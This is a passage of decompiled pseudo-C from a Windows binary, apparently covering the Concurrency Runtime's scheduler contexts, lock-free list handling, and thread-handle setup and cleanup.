    _InterlockedIncrement((volatile signed __int32 *)(v3 + 20));
  sub_45AA03(a2 + 76);
  _InterlockedExchange((volatile __int32 *)(a2 + 56), 1);
  return sub_459FC1(this + 42, (_DWORD *)(a2 + 44));
}

//----- (0045A61F) --------------------------------------------------------
int __thiscall sub_45A61F(int this, int a2)
{
  sub_44AE12((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 4) = a2;
  *(_DWORD *)(this + 4) = a2 + 12;
  return sub_44AE53((_DWORD *)(this + 8));
}

//----- (0045A65A) --------------------------------------------------------
_DWORD *__thiscall sub_45A65A(char *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  int v5[4]; // [esp+Ch] [ebp-10h] BYREF

  v3 = *(_DWORD **)&this[((*a2 & 0xFFFFFFF) != 0 ? 0xFFFFFFFC : 0) + 16];
  sub_458041(*(int **)(a3 + 4), v5);
  while ( v3 && (!sub_452C38(v3 + 3, a2) || v3[2] != a3) )
    v3 = (_DWORD *)v3[65];
  return v3;
}
// 45A65A: using guessed type int var_10[4];

//----- (0045A6AE) --------------------------------------------------------
struct _SINGLE_LIST_ENTRY *__thiscall sub_45A6AE(union _SLIST_HEADER *this)
{
  int v2; // esi
  int Next; // ebx
  struct _SINGLE_LIST_ENTRY *v4; // eax
  struct _SINGLE_LIST_ENTRY *v6; // esi
  struct _SINGLE_LIST_ENTRY *v7; // [esp+Ch] [ebp-4h]

  v2 = 0;
  Next = (int)this[29].Next.Next;
  if ( Next <= 0 )
    return 0;
  while ( 1 )
  {
    v4 = (struct _SINGLE_LIST_ENTRY *)sub_44F5A7(&this[21], v2);
    v7 = v4;
    if ( v4 )
    {
      if ( sub_45AA75(this + 21, v4, v2, 0) )
        break;
    }
    if ( ++v2 >= Next )
      return 0;
  }
  v6 = v7[2].Next;
  _InterlockedExchange((volatile __int32 *)&v6[14], 0);
  sub_4512CA(this[32].Next.Next);
  return v6;
}

//----- (0045A713) --------------------------------------------------------
int __thiscall sub_45A713(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // esi

  v4 = sub_450810(*(_DWORD *)(this[64] + 4), 1);
  v5 = v4;
  if ( v4 )
    sub_458FAE(v4, (int)this, a2, a3);
  return v5;
}

//----- (0045A746) --------------------------------------------------------
int __thiscall sub_45A746(int *this)
{
  int *v1; // ecx

  v1 = this + 10;
  if ( *v1 )
    return sub_45A5AC(v1);
  else
    return 0;
}

//----- (0045A756) --------------------------------------------------------
_DWORD *__thiscall sub_45A756(int *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x2Cu);
  result = 0;
  if ( v3 )
    result = sub_459D32(v3, *this, (int)(this + 1), this[3], this[3] + *(_DWORD *)(a2 + 16));
  this[4] = (int)result;
  *(_DWORD *)(a2 + 24) = result;
  return result;
}

//----- (0045A7A0) --------------------------------------------------------
bool __thiscall sub_45A7A0(_DWORD *this)
{
  return this[10] != 0;
}

//----- (0045A7A8) --------------------------------------------------------
bool __thiscall sub_45A7A8(void *this)
{
  return sub_45A9AA((int)this) != 0;
}

//----- (0045A7B3) --------------------------------------------------------
int __thiscall sub_45A7B3(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_44FFD9((int)(this + 1), a2);
  if ( this[5] )
    return sub_44FFD9(this[5] + 4, a2);
  return result;
}

//----- (0045A7DC) --------------------------------------------------------
int __thiscall sub_45A7DC(int *this, _DWORD *a2)
{
  this[5] = 1;
  return sub_452901(this + 8, a2);
}

//----- (0045A7EF) --------------------------------------------------------
int __thiscall sub_45A7EF(int this, int a2, int a3, _DWORD *a4)
{
  void **v5; // eax
  void *v7[2]; // [esp+Ch] [ebp-8h] BYREF

  *(_DWORD *)(this + 256) = a2;
  *(_DWORD *)(this + 8) = a3;
  sub_452901((int *)(this + 12), a4);
  *(_DWORD *)(this + 272) = 0;
  *(_DWORD *)(this + 284) = 1;
  v5 = (void **)sub_45065D(*(unsigned int **)(a2 + 4), v7, a4);
  sub_459F72((void **)(this + 28), v5);
  j_j__free(v7[1]);
  if ( (*a4 & 0xFFFFFFF) == 3 )
    *(_DWORD *)(this + 36) = sub_45727F(*(unsigned int **)(a2 + 4), a4[2]);
  return sub_45A7B3((_DWORD *)(this + 52), this + 28);
}

//----- (0045A871) --------------------------------------------------------
bool __thiscall sub_45A871(_DWORD *this)
{
  return this[1] <= *this && this[20] <= this[19];
}

//----- (0045A886) --------------------------------------------------------
_DWORD *__thiscall sub_45A886(int *this, unsigned int a2, char a3)
{
  _DWORD *v4; // ecx
  int v5; // edx

  if ( !this[5] )
    sub_45A474(this);
  if ( a3 )
    v4 = (_DWORD *)this[4];
  else
    v4 = (_DWORD *)this[5];
  while ( 1 )
  {
    v5 = (int)v4;
    if ( a2 < this[3] + v4[4] )
      break;
    v4 = (_DWORD *)v4[6];
    if ( !v4 )
    {
      v4 = sub_45A756(this, v5);
      if ( !v4 )
        break;
    }
  }
  return v4;
}

//----- (0045A8CE) --------------------------------------------------------
int __thiscall sub_45A8CE(int this, int *a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v6; // esi
  char i; // al
  int *v8; // eax
  int *v9; // eax
  int result; // eax
  int v11[4]; // [esp+Ch] [ebp-30h] BYREF
  int v12[4]; // [esp+1Ch] [ebp-20h] BYREF
  int v13[4]; // [esp+2Ch] [ebp-10h] BYREF

  v4 = sub_450364(*(void **)(this + 4));
  if ( v4 )
    v5 = *(_DWORD *)(v4 + 4);
  else
    v5 = sub_4509F4(*(_DWORD **)(this + 4));
  sub_458041(*(int **)(v5 + 4), v12);
  v6 = v5;
  memset(v13, 0, sizeof(v13));
  for ( i = sub_45C9E7((int)v12, a2); !i; i = sub_45C9E7((int)v12, v9) )
  {
    v5 = sub_4509CB(*(_DWORD **)(this + 4), 0, v5);
    v8 = sub_458041(*(int **)(v5 + 4), v11);
    sub_452901(v12, v8);
    if ( v5 == v6 )
    {
      v9 = v13;
      a2 = v13;
    }
    else
    {
      v9 = a2;
    }
  }
  result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
  if ( !result && a3 )
  {
    sub_44AE22((volatile __int32 *)(this + 8));
    result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
    if ( !result )
      result = sub_45A3C3((char *)this, a2, v5);
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}
// 45A8CE: using guessed type int var_20[4];
// 45A8CE: using guessed type int var_30[4];

//----- (0045A9AA) --------------------------------------------------------
struct _SINGLE_LIST_ENTRY *__thiscall sub_45A9AA(int this)
{
  int i; // edi
  struct _SINGLE_LIST_ENTRY *result; // eax

  for ( i = 0; i < *(_DWORD *)(this + 152); ++i )
  {
    result = (struct _SINGLE_LIST_ENTRY *)sub_44F5A7((_DWORD *)(this + 88), i);
    if ( result )
    {
      if ( (int)result[1].Next > (int)result->Next || (int)result[20].Next > (int)result[19].Next )
        return result;
      if ( result[14].Next == (struct _SINGLE_LIST_ENTRY *)1 )
        sub_45ABEF((union _SLIST_HEADER *)this, result);
    }
  }
  return (struct _SINGLE_LIST_ENTRY *)(*(_DWORD *)(this + 76) != *(_DWORD *)(this + 80));
}

//----- (0045AA03) --------------------------------------------------------
int __thiscall sub_45AA03(int this)
{
  volatile __int32 *v2; // esi
  int v3; // eax

  v2 = *(volatile __int32 **)(this + 16);
  sub_44AE12(v2);
  v3 = *(_DWORD *)(this + 4);
  *(_BYTE *)(this + 20) = 1;
  *(_DWORD *)(this + 24) = v3;
  return sub_44AE53(v2);
}

//----- (0045AA36) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_45AA36(_DWORD *this, int a2)
{
  return sub_459FC1(this + 42, (_DWORD *)(a2 + 44));
}

//----- (0045AA4F) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_45AA4F(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2)
{
  sub_4590E1((int)a2);
  return sub_451A84(*(_DWORD *)(this[64] + 4), a2, 0);
}

//----- (0045AA75) --------------------------------------------------------
char __thiscall sub_45AA75(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 1;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_450C9C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_45A392,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0045AB66) --------------------------------------------------------
char __thiscall sub_45AB66(int this)
{
  sub_451E4A(*(_DWORD *)(*(_DWORD *)(this + 256) + 4), this + 272);
  return sub_459B72(*(char **)(this + 8), this);
}

//----- (0045AB89) --------------------------------------------------------
char __thiscall sub_45AB89(_DWORD *this)
{
  int v2; // ecx
  int v3; // esi
  char result; // al
  int v5; // ecx
  int v6; // esi

  v2 = this[4];
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 260);
      result = sub_45AB66(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v5 = this[3];
  if ( v5 )
  {
    do
    {
      v6 = *(_DWORD *)(v5 + 260);
      result = sub_45AB66(v5);
      v5 = v6;
    }
    while ( v6 );
  }
  this[4] = 0;
  this[3] = 0;
  return result;
}

//----- (0045ABC8) --------------------------------------------------------
signed __int32 __thiscall sub_45ABC8(union _SLIST_HEADER *this, int a2)
{
  sub_45376B(this + 11, (struct _SINGLE_LIST_ENTRY *)a2, *(_DWORD *)(a2 + 68), 1);
  return sub_4512CA(this[32].Next.Next);
}

//----- (0045ABEF) --------------------------------------------------------
char __thiscall sub_45ABEF(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2)
{
  if ( sub_45AA75(this + 21, a2 + 11, (int)a2[11].Next, 0) )
  {
    if ( (int)a2[20].Next <= (int)a2[19].Next )
    {
      sub_45BB1E((int)a2, (int)this);
      return 1;
    }
    sub_45BAC0((int)a2, (int)this);
  }
  return 0;
}

//----- (0045AC31) --------------------------------------------------------
int __thiscall sub_45AC31(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v4; // eax

  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  return sub_45AC89(v4, a2, a3);
}

//----- (0045AC61) --------------------------------------------------------
int __thiscall sub_45AC61(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, (int)this + 32, 1);
  return sub_45AC89(v3, a2, a3);
}

//----- (0045AC89) --------------------------------------------------------
int __thiscall sub_45AC89(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  _DWORD *v11; // esi
  _DWORD *v12; // edx
  int result; // eax
  int (__thiscall *v14)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *); // esi
  int v15[2]; // [esp-10h] [ebp-2Ch] BYREF
  struct _SINGLE_LIST_ENTRY *v16; // [esp-8h] [ebp-24h]
  struct _SINGLE_LIST_ENTRY *v17; // [esp-4h] [ebp-20h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v19; // [esp+18h] [ebp-4h]

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"proc");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = this[64];
  v17 = a3;
  v16 = a2;
  v5 = *(_DWORD *)(v4 + 4);
  v6 = sub_450A82((union _SLIST_HEADER *)v5, a2, a3);
  v7 = this[64];
  if ( (*(_BYTE *)(v7 + 48) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v7 + 20));
  sub_45A61F((int)(this + 10), v6);
  v8 = sub_4501C0();
  v9 = v8;
  if ( v8 && sub_43E90F(v8) == v5 )
  {
    v10 = v9[39];
    if ( *((_BYTE *)v9 + 76) )
      ++*(_DWORD *)(v10 + 8);
    else
      ++*(_DWORD *)(v10 + 104);
  }
  else
  {
    v11 = sub_44AAC3(*(_DWORD *)(v5 + 24));
    if ( !v11 )
    {
      v11 = operator new(0x1Cu);
      v19 = v11;
      if ( v11 )
      {
        v11[2] = 0;
        v11[3] = 0;
        v11[4] = 0;
        v11[5] = 0;
        v11[6] = 1;
      }
      else
      {
        v11 = 0;
      }
      sub_459FC1((_DWORD *)(v5 + 200), v11);
      sub_44AAD1(*(_DWORD *)(v5 + 24), v11);
    }
    ++v11[2];
  }
  v12 = this + 3;
  if ( (this[3] & 0xFFFFFFF) != 0 )
  {
    (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    v12 = this + 3;
  }
  result = *(_DWORD *)(v5 + 440);
  if ( *(_DWORD *)(v5 + 436) - result > 0 )
  {
    v14 = *(int (__thiscall **)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)v5 + 56);
    sub_452901(v15, v12);
    return v14(v5, this, v15[0], v15[1], v16, v17);
  }
  return result;
}

//----- (0045ADBD) --------------------------------------------------------
int __thiscall sub_45ADBD(int this, unsigned int a2)
{
  int result; // eax

  result = this + 20;
  if ( !(a2 + _InterlockedExchangeAdd((volatile signed __int32 *)(this + 20), a2)) )
    return sub_451340(
             (int (__cdecl **)(int))(this + 28),
             (int (__cdecl *)(int))sub_4538B5,
             (int (__cdecl *)(int))this,
             *(_DWORD *)this);
  return result;
}

//----- (0045ADE3) --------------------------------------------------------
_BYTE *__thiscall sub_45ADE3(int this, char a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // edx
  volatile __int32 *v6; // eax
  volatile __int32 *v7; // edi
  _BYTE *result; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  bool v12; // zf
  bool v13; // al
  int v14; // eax
  volatile __int32 *v15; // eax
  volatile __int32 *v16; // edi
  char v17; // al
  struct _SINGLE_LIST_ENTRY *v18; // eax
  int v19; // [esp+Ch] [ebp-5Ch]
  _BYTE *v20; // [esp+14h] [ebp-54h] BYREF
  int v21; // [esp+18h] [ebp-50h]
  int v22; // [esp+1Ch] [ebp-4Ch]
  char v23; // [esp+22h] [ebp-46h] BYREF
  char v24; // [esp+23h] [ebp-45h]
  int v25[16]; // [esp+24h] [ebp-44h]

  v3 = 0;
  v24 = 0;
  v19 = *(_DWORD *)(this + 152);
  if ( v19 > 0 )
  {
    v4 = 0;
    v21 = 0;
    v23 = 0;
    v5 = (_DWORD *)(this + 88);
    v22 = 0;
    while ( 1 )
    {
      v6 = (volatile __int32 *)sub_44F5A7(v5, v4);
      v7 = v6;
      if ( !v6 )
        goto LABEL_15;
      if ( sub_45A871(v6) )
        break;
      result = (_BYTE *)sub_45BC67(v7, a2, &v23);
      v20 = result;
      if ( result )
        return result;
      if ( v23 )
        goto LABEL_10;
      v9 = v21;
      if ( v21 >= 15 )
      {
        result = (_BYTE *)sub_45BB64(v7, a2);
        v20 = result;
        if ( result )
          return result;
LABEL_10:
        if ( *((_DWORD *)v7 + 14) != 1 || (v12 = !sub_45A871(v7), v13 = 1, v12) )
          v13 = 0;
        goto LABEL_14;
      }
      v10 = v22;
      v25[v21] = v22;
      v11 = v9 + 1;
      v21 = v11;
LABEL_16:
      v4 = v10 + 1;
      v5 = (_DWORD *)(this + 88);
      v22 = v4;
      if ( v4 >= v19 )
      {
        if ( v11 > 0 )
        {
          v14 = 0;
          v22 = 0;
          while ( 1 )
          {
            v15 = (volatile __int32 *)sub_44F5A7((_DWORD *)(this + 88), v25[v14]);
            v16 = v15;
            if ( v15 )
            {
              if ( !sub_45A871(v15) )
              {
                result = (_BYTE *)sub_45BB64(v16, a2);
                v20 = result;
                if ( result )
                  return result;
              }
              if ( *((_DWORD *)v16 + 14) != 1 || (v12 = !sub_45A871(v16), v17 = 1, v12) )
                v17 = 0;
              v24 |= v17;
            }
            v14 = v22 + 1;
            v22 = v14;
            if ( v14 >= v21 )
              goto LABEL_27;
          }
        }
        goto LABEL_27;
      }
    }
    v13 = *((_DWORD *)v7 + 14) == 1;
LABEL_14:
    v24 |= v13;
LABEL_15:
    v10 = v22;
    v11 = v21;
    goto LABEL_16;
  }
LABEL_27:
  if ( sub_45A4EA((volatile signed __int32 *)(this + 52), &v20) )
  {
    sub_45BF1A(v20, 1);
    return v20;
  }
  else
  {
    if ( *(int *)(this + 232) > 0 && v24 && *(int *)(this + 152) > 0 )
    {
      do
      {
        v18 = (struct _SINGLE_LIST_ENTRY *)sub_44F5A7((_DWORD *)(this + 88), v3);
        if ( v18 && v18[14].Next == (struct _SINGLE_LIST_ENTRY *)1 && (int)v18[20].Next <= (int)v18[19].Next )
          sub_45ABEF((union _SLIST_HEADER *)this, v18);
        ++v3;
      }
      while ( v3 < *(_DWORD *)(this + 152) );
    }
    return 0;
  }
}
// 45ADE3: using guessed type int var_44[16];

//----- (0045AF8E) --------------------------------------------------------
_DWORD *__thiscall sub_45AF8E(int *this, _DWORD *a2, int a3)
{
  int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // esi

  sub_44EFC9(a2, *this);
  v4 = *this;
  v5 = 0;
  v6 = (unsigned int)(v4 + 31) >> 5;
  if ( v6 )
  {
    do
    {
      *(_DWORD *)(a2[1] + 4 * v5) = *(_DWORD *)(this[1] + 4 * v5) & *(_DWORD *)(*(_DWORD *)(a3 + 4) + 4 * v5);
      ++v5;
    }
    while ( v5 < v6 );
  }
  return a2;
}

//----- (0045AFDA) --------------------------------------------------------
int __thiscall sub_45AFDA(void *this, int a2)
{
  return sub_45B038((int)this + 296, a2);
}

//----- (0045AFE9) --------------------------------------------------------
_DWORD *__thiscall sub_45AFE9(int this, _DWORD *a2, int a3)
{
  volatile signed __int32 *v4; // ebx
  _DWORD *v5; // esi
  int v6; // edi
  _DWORD *result; // eax
  _DWORD *v8; // [esp+Ch] [ebp-4h]

  v8 = (_DWORD *)(this + 32);
  sub_44AE22((volatile __int32 *)(this + 32));
  v4 = (volatile signed __int32 *)(this + 28);
  v5 = sub_45A886((int *)this, *(_DWORD *)(this + 28), 1);
  v6 = *v4 - v5[4];
  *(_DWORD *)(v5[3] + 4 * v6) = a3;
  _InterlockedIncrement(v4);
  *v8 = 0;
  result = a2;
  a2[1] = v6;
  *a2 = v5;
  return result;
}

//----- (0045B038) --------------------------------------------------------
int __thiscall sub_45B038(int this, int a2)
{
  sub_44AE12((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 232) = 0;
  **(_DWORD **)(this + 4) = a2;
  *(_DWORD *)(this + 4) = a2 + 232;
  return sub_44AE53((_DWORD *)(this + 8));
}

//----- (0045B076) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_45B076(_DWORD *this, int a2)
{
  unsigned int v2; // edi
  unsigned int v3; // esi
  volatile signed __int32 *result; // eax

  v2 = 0;
  v3 = (unsigned int)(*this + 31) >> 5;
  if ( v3 )
  {
    do
    {
      result = (volatile signed __int32 *)(4 * v2 + this[1]);
      _InterlockedOr(result, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v2++));
    }
    while ( v2 < v3 );
  }
  return result;
}

//----- (0045B0AE) --------------------------------------------------------
_DWORD *__thiscall sub_45B0AE(void *this, _DWORD *a2, int a3, int a4, _DWORD *a5)
{
  void *v5; // eax

  v5 = (void *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  *a5 = v5;
  sub_45B0E6(v5, a2, a3);
  return a2;
}

//----- (0045B0E6) --------------------------------------------------------
_DWORD *__thiscall sub_45B0E6(void *this, _DWORD *a2, int a3)
{
  sub_45AFE9((int)this + 52, a2, a3);
  return a2;
}

//----- (0045B0FE) --------------------------------------------------------
int __thiscall sub_45B0FE(int *this)
{
  _DWORD *v2; // edi
  int result; // eax

  v2 = *(_DWORD **)(this[64] + 4);
  sub_45B131(v2, this + 7);
  result = this[3] & 0xFFFFFFF;
  if ( result == 3 )
    return sub_45B16F(v2, this[9], (signed __int32)this);
  return result;
}

//----- (0045B131) --------------------------------------------------------
void __thiscall sub_45B131(_DWORD *this, int *a2)
{
  _DWORD *v3; // eax
  void *v4[2]; // [esp+8h] [ebp-8h] BYREF

  if ( sub_451304(a2, (int)(this + 18)) )
  {
    v3 = sub_45AF8E(a2, v4, (int)(this + 18));
    sub_45B076(this + 21, (int)v3);
    j_j__free(v4[1]);
  }
}

//----- (0045B16F) --------------------------------------------------------
signed __int32 __thiscall sub_45B16F(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = this[23];
  if ( !*(_DWORD *)((a2 << 7) + result) )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), a3, 0);
  return result;
}

//----- (0045B195) --------------------------------------------------------
_DWORD *__thiscall sub_45B195(int this, int a2, int a3)
{
  bool v3; // zf
  int v5[4]; // [esp+0h] [ebp-10h] BYREF

  v3 = (*(_BYTE *)(this + 48) & 4) == 0;
  memset(v5, 0, sizeof(v5));
  if ( v3 )
    return *(_DWORD **)(this + 56);
  else
    return sub_45A65A((char *)this, v5, a3);
}

//----- (0045B1C4) --------------------------------------------------------
int __thiscall sub_45B1C4(int this, int a2, char a3)
{
  int result; // eax
  int v5; // eax
  int v6[4]; // [esp+8h] [ebp-10h] BYREF

  memset(v6, 0, sizeof(v6));
  if ( (*(_BYTE *)(this + 48) & 4) != 0 )
    return sub_45A8CE(this, v6, a3);
  result = *(_DWORD *)(this + 56);
  if ( a3 && !result )
  {
    sub_44AE22((volatile __int32 *)(this + 8));
    result = *(_DWORD *)(this + 56);
    if ( !result )
    {
      v5 = sub_4509F4(*(_DWORD **)(this + 4));
      result = sub_45A3C3((char *)this, v6, v5);
      *(_DWORD *)(this + 56) = result;
    }
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}

//----- (0045B22D) --------------------------------------------------------
_DWORD *__thiscall sub_45B22D(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // ecx

  sub_452A73(this, a2, 1);
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  this[40] = 0;
  this[41] = 0;
  v4 = sub_44A69C(0);
  v5 = (_DWORD *)this[7];
  this[42] = v4;
  this[6] = sub_450654(v5);
  v6 = operator new(0x1Cu);
  if ( v6 )
  {
    v6[2] = 0;
    v6[3] = 0;
    v6[4] = 0;
    v6[5] = 0;
    v6[6] = 1;
  }
  else
  {
    v6 = 0;
  }
  v7 = (_DWORD *)(this[7] + 200);
  this[39] = v6;
  sub_459FC1(v7, v6);
  sub_45B4C7((int)this, a3);
  return this;
}
// 494358: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (0045B2C6) --------------------------------------------------------
void __thiscall sub_45B2C6(_DWORD *this)
{
  *this = &Concurrency::details::ExternalContextBase::`vftable';
  sub_45B3A7((int)this);
  sub_452BBA(this);
}
// 494358: using guessed type void *Concurrency::details::ExternalContextBase::`vftable';

//----- (0045B30B) --------------------------------------------------------
_DWORD *__thiscall sub_45B30B(_DWORD *Block, char a2)
{
  sub_45B2C6(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0045B330) --------------------------------------------------------
int *__thiscall sub_45B330(_DWORD *this, int a2)
{
  PSLIST_ENTRY v2; // eax

  v2 = sub_45B424(this);
  if ( v2 )
    return sub_4581B6(v2, a2);
  else
    return sub_4582B8(a2);
}

//----- (0045B351) --------------------------------------------------------
DWORD __thiscall sub_45B351(int this)
{
  int v1; // ebx
  int v2; // eax
  DWORD result; // eax

  v1 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_453A71(3, 4u, v2, v1);
  result = _InterlockedIncrement((volatile signed __int32 *)(this + 44));
  if ( result == 1 )
    return WaitForSingleObjectEx(*(HANDLE *)(this + 168), 0xFFFFFFFF, 0);
  return result;
}

//----- (0045B3A7) --------------------------------------------------------
int __thiscall sub_45B3A7(int this)
{
  int result; // eax

  sub_4530C9(this);
  if ( *(_DWORD *)(this + 164) )
  {
    CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  if ( *(_DWORD *)(this + 168) )
    CloseHandle(*(HANDLE *)(this + 168));
  if ( *(_DWORD *)(this + 160) )
    sub_451FE3(*(char **)(this + 160));
  result = *(_DWORD *)(this + 156);
  *(_DWORD *)(this + 156) = 0;
  *(_DWORD *)(result + 24) = 0;
  return result;
}

//----- (0045B3FF) --------------------------------------------------------
void __thiscall sub_45B3FF(_DWORD *this, int a2)
{
  int *v2; // eax

  v2 = (int *)sub_45B424(this);
  if ( v2 )
    sub_458230(v2, a2);
  else
    j_j__free((void *)(a2 - 4));
}

//----- (0045B424) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_45B424(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[40];
  if ( !result )
  {
    result = sub_450B09(1);
    this[40] = result;
  }
  return result;
}

//----- (0045B441) --------------------------------------------------------
int sub_45B441()
{
  return -1;
}

//----- (0045B445) --------------------------------------------------------
HMODULE __stdcall sub_45B445(int a1, int a2, int a3, int a4)
{
  sub_45017E(*(volatile signed __int32 **)(a2 + 28), (struct _SINGLE_LIST_ENTRY *)a2, 0);
  return sub_44ADDD(a1, a3);
}

//----- (0045B467) --------------------------------------------------------
int __stdcall sub_45B467(PVOID a1, int a2)
{
  sub_44AB13(*((HANDLE *)a1 + 43));
  return sub_45017E(*((volatile signed __int32 **)a1 + 7), (struct _SINGLE_LIST_ENTRY *)a1, 0);
}

//----- (0045B48A) --------------------------------------------------------
bool __thiscall sub_45B48A(_DWORD *this)
{
  return this[11] == 1;
}

//----- (0045B492) --------------------------------------------------------
int __thiscall sub_45B492(_DWORD *this, char a2)
{
  int v2; // eax
  int result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  v2 = this[5];
  if ( a2 )
  {
    result = v2 + 1;
  }
  else
  {
    if ( !v2 )
    {
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_oversubscribe_operation_Concurrency__);
    }
    result = v2 - 1;
  }
  this[5] = result;
  return result;
}

//----- (0045B4C7) --------------------------------------------------------
DWORD __thiscall sub_45B4C7(int this, char a2)
{
  DWORD result; // eax
  HANDLE CurrentProcess; // edi
  HANDLE CurrentThread; // esi
  HANDLE v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-14h] BYREF
  PVOID Context; // [esp+18h] [ebp-4h]

  Context = (PVOID)this;
  *(_BYTE *)(this + 152) = a2;
  result = GetCurrentThreadId();
  *(_DWORD *)(this + 68) = result;
  if ( !a2 )
  {
    CurrentProcess = GetCurrentProcess();
    CurrentThread = GetCurrentThread();
    v6 = GetCurrentProcess();
    if ( !DuplicateHandle(v6, CurrentThread, CurrentProcess, (LPHANDLE)Context + 41, 0, 0, 2u) )
    {
      LastError = GetLastError();
      if ( LastError <= 0 )
        goto LABEL_11;
      goto LABEL_10;
    }
    if ( sub_44CE8E() < 3 )
    {
      result = (DWORD)sub_44A977(*((HANDLE *)Context + 41), (WAITORTIMERCALLBACK)sub_45B467, Context);
      *((_DWORD *)Context + 43) = result;
    }
